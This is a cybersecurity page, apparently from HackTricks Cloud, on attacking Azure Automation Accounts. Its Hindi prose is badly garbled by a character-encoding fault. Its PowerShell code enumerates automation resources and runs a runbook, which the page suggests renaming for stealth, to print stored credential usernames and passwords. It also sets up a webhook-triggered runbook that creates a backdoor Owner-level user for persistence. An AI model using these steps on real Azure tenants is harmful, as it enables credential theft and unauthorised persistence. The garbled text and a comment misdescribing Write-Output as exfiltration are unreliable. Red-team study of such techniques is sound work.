# Az - Automation Account

<details>

<summary><strong>рдмрдврд╝рд┐рдпрд╛ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рддреБрд░рдВрдд** рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

Azure Automation рдПрдХ рдХреНрд▓рд╛рдЙрдб-рдЖрдзрд╛рд░рд┐рдд рд╕реНрд╡рдЪрд╛рд▓рди, рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдЕрдкрдбреЗрдЯ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ Azure рдФрд░ рдЧреИрд░-Azure рдкрд░реНрдпрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рд╕рдВрдЧрдд рдкреНрд░рдмрдВрдзрди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реНрд╡рдЪрд╛рд▓рди, рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди, рдЕрдкрдбреЗрдЯ рдкреНрд░рдмрдВрдзрди, рд╕рд╛рдЭрд╛ рдХреНрд╖рдорддрд╛рдПрдВ рдФрд░ рд╡рд┐рд╡рд┐рдз рд╕реБрд╡рд┐рдзрд╛рдПрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдпреЗ рд╡реЗ "**рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп**" рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдЪреАрдЬреЗрдВ (рдХреНрд░рд┐рдпрд╛рдПрдБ рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рддрдХ) **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ рддрд╛рдХрд┐ рдЖрдк **Azure рдкрд░реНрдпрд╛рд╡рд░рдг** рдХрд╛ **рдкреНрд░рдмрдВрдзрди**, рдЬрд╛рдВрдЪ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗрдВред

### рд░рди рдПрд╕ рдЦрд╛рддрд╛

**Run as Account** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░, рдпрд╣ рдПрдХ Azure AD **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрд╡-рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдПрдХ **рд╕реЗрд╡рд╛ рдкреНрд░рдореБрдЦ** рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ **рд╡рд░реНрддрдорд╛рди рд╕рджрд╕реНрдпрддрд╛** рдореЗрдВ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **рдпреЛрдЧрджрд╛рдирдХрд░реНрддрд╛** рднреВрдорд┐рдХрд╛ рдХрд╛ рдирд┐рдпреБрдХреНрддрд┐ рдХрд░рддрд╛ рд╣реИ (рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░)ред\
рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдиреЗ Automation Account рдХреЗ рд▓рд┐рдП **рдкреНрд░рдмрдВрдзрд┐рдд рдкрд╣рдЪрд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рд╣реИред

{% hint style="warning" %}
рдпрд╣ **30 рд╕рд┐рддрдВрдмрд░, 2023 рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдкрд╣рдЪрд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**
{% endhint %}

## Runbooks & Jobs рдХреЛ рд╣рд╛рдирд┐ рдкрд╣реБрдВрдЪрд╛рдПрдВ

**Runbooks** рдЖрдкрдХреЛ **рдЕрдирд┐рдпрдорд┐рдд PowerShell** рдХреЛрдб рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ **рд╕рдВрд▓рдЧреНрди рдкреНрд░рдореБрдЦ** рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЪреЛрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**Runbooks** рдХреЗ **рдХреЛрдб** рдореЗрдВ рдЖрдкрдХреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** (рдЬреИрд╕реЗ рдХрд┐ creds) рднреА рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

рдпрджрд┐ рдЖрдк **рдЬреЙрдмреНрд╕** рдХреЛ **рдкрдврд╝ рд╕рдХрддреЗ** рд╣реИрдВ, рддреЛ рдЗрд╕реЗ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд░рди рдХрд╛ **рдЖрдЙрдЯрдкреБрдЯ** (рд╕рдВрднрд╛рд╡рд┐рдд **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА**) рд╣реЛрддрд╛ рд╣реИред

`Automation Accounts` рдкрд░ рдЬрд╛рдПрдВ --> `<рдЪрдпрдирд┐рдд Automation Account>` --> `Runbooks/Jobs/Hybrid worker groups/Watcher tasks/credentials/variables/certificates/connections`

### рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд░реНрдордЪрд╛рд░реА

рдПрдХ Runbook рдХреЛ рдПрдХ **Azure рдХрдВрдЯреЗрдирд░** рдореЗрдВ рдпрд╛ рдПрдХ **рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд░реНрдордЪрд╛рд░реА** рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**рд▓реЙрдЧ рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рдПрдЬреЗрдВрдЯ** VM рдкрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд░реНрдордЪрд╛рд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд░реНрдордЪрд╛рд░реА рдЬреЙрдмреНрд╕ Windows рдкрд░ **SYSTEM** рдФрд░ Linux рдкрд░ **nxautomation** рдЦрд╛рддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддреЗ рд╣реИрдВред\
рдкреНрд░рддреНрдпреЗрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд░реНрдордЪрд╛рд░реА рдПрдХ **рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд░реНрдордЪрд╛рд░реА рд╕рдореВрд╣** рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **Windows Hybrid Worker** рдореЗрдВ рдПрдХ **Runbook** рдЪрд▓рд╛рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдорд╢реАрди рдореЗрдВ **System** рдХреЗ рд░реВрдк рдореЗрдВ **рдЕрдирд┐рдпрдорд┐рдд рдХрдорд╛рдВрдб** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВрдЧреЗред

## рд╕реНрдерд┐рддрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (SC) рдХреЛ рд╣рд╛рдирд┐ рдкрд╣реБрдВрдЪрд╛рдПрдВ

Azure Automation **рд╕реНрдерд┐рддрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдПрдХ Azure рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЙрдб рдпрд╛ рдСрди-рдкреНрд░реЗрдорд┐рд╕ рдбреЗрдЯрд╛рд╕реЗрдВрдЯрд░ рдореЗрдВ рдиреЛрдб рдХреЗ рд▓рд┐рдП PowerShell Desired State Configuration (DSC) [configurations](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) рд▓рд┐рдЦрдиреЗ, рдкреНрд░рдмрдВрдзрд┐рдд рдФрд░ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╕реЗрд╡рд╛ рднреА [DSC рд╕рдВрд╕рд╛рдзрди](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources) рдЖрдпрд╛рдд рдХрд░рддреА рд╣реИ рдФрд░ рд▓рдХреНрд╖рд┐рдд рдиреЛрдбреНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд┐рдпреБрдХреНрдд рдХрд░рддреА рд╣реИ, рд╕рдм рдХреБрдЫ рдХреНрд▓рд╛рдЙрдб рдореЗрдВред рдЖрдк Azure Automation рд╕реНрдерд┐рддрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдЖрдк Azure рдкреЛрд░реНрдЯрд▓ рдореЗрдВ **рд╕реНрдерд┐рддрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (DSC)** рдХрд╛ рдЪрдпрди рдХрд░рддреЗ рд╣реИрдВред

рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### RCE

SC рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдмрдВрдзрд┐рдд рдорд╢реАрдиреЛрдВ рдореЗрдВ рдЕрдирд┐рдпрдорд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## рдЬрд╛рдВрдЪ

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### рдПрдХ рд░рдирдмреБрдХ рдмрдирд╛рдПрдВ

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### рдПрдХ рд░рди рдмреБрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ рд░рди рдмреБрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд░рди рдмреБрдХ рдПрдХ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рднреАрддрд░ рдПрдХ рдПрдХреНрд╢рди рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдЕрдиреБрдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЖрдк рд░рди рдмреБрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдПрдХ рдмрд╛рд╣рд░реА рд╕реНрдерд╛рди рдкрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдЖрдк рдПрдХ рд░рди рдмреБрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ:

```powershell
$cred = Get-AutomationPSCredential -Name 'MyCredential'
$var = Get-AutomationVariable -Name 'MyVariable'

# Exfiltrate the credentials and variables to an external location
# рдПрдХ рдмрд╛рд╣рд░реА рд╕реНрдерд╛рди рдкрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВ
Write-Output "Credentials: $cred"
Write-Output "Variable: $var"
```

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, `Get-AutomationPSCredential` рдФрд░ `Get-AutomationVariable` рдХрдорд╛рдВрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рдЕрдкрдиреЗ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдлрд┐рд░ рд╣рдо `Write-Output` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рд╕реНрдерд╛рди рдкрд░ рдирд┐рдХрд╛рд▓ рд░рд╣реЗ рд╣реИрдВред

рдЖрдк рдЗрд╕ рд░рди рдмреБрдХ рдХреЛ рдЕрдкрдиреЗ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдк рдЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░реЛрдВ рдХреЛ рдмрд╛рд╣рд░реА рд╕реНрдерд╛рди рдкрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдкрдиреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% hint style="info" %}
рдЖрдк рдПрдХ рдореМрдЬреВрджрд╛ рд░рдирдмреБрдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ рд╡реЗрдм рдХрдВрд╕реЛрд▓ рд╕реЗ рднреА рдпрд╣реА рдХрд╛рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

## рд╕реНрдерд╛рдпрд┐рддреНрд╡

### рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рд╡рд╛рд▓реА рд╕реНрд╡рдЪрд╛рд▓рди

* рдПрдХ рдирдпрд╛ рд╕реНрд╡рдЪрд╛рд▓рди рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВ
* "Azure Run As рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВ": рд╣рд╛рдБ
* рдПрдХ рдирдпрд╛ рд░рдирдмреБрдХ рдЖрдпрд╛рдд рдХрд░реЗрдВ рдЬреЛ рд╕рджрд╕реНрдпрддрд╛ рдХреЗ рд▓рд┐рдП Owner рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ AzureAD рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддрд╛ рд╣реИ
* рдЗрд╕ рдмреНрд▓реЙрдЧ рдХреЗ рд▓рд┐рдП рдирдореВрдирд╛ рд░рдирдмреБрдХ рдпрд╣рд╛рдВ рд╕реНрдерд┐рдд рд╣реИ - [https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
* рд░рдирдмреБрдХ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ
* рд░рдирдмреБрдХ рдореЗрдВ рдПрдХ рд╡реЗрдмрд╣реБрдХ рдЬреЛрдбрд╝реЗрдВ
* рд╕реНрд╡рдЪрд╛рд▓рди рдЦрд╛рддреЗ рдореЗрдВ AzureAD рдореЙрдбреНрдпреВрд▓ рдЬреЛрдбрд╝реЗрдВ
* Azure рд╕реНрд╡рдЪрд╛рд▓рди рдореЙрдбреНрдпреВрд▓ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ
* "рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ" рдФрд░ "рд╕рджрд╕реНрдпрддрд╛ рдорд╛рд▓рд┐рдХ" рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рди рдЦрд╛рддреЗ рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд░реЗрдВ
* рдЕрдВрдд рдореЗрдВ рдЕрдкрдирд╛ рдкрд╣реБрдВрдЪ рдЦреЛ рджреЗрдВ...
*   рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд╡реЗрдмрд╣реБрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ

```powershell
$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
$AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```

## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
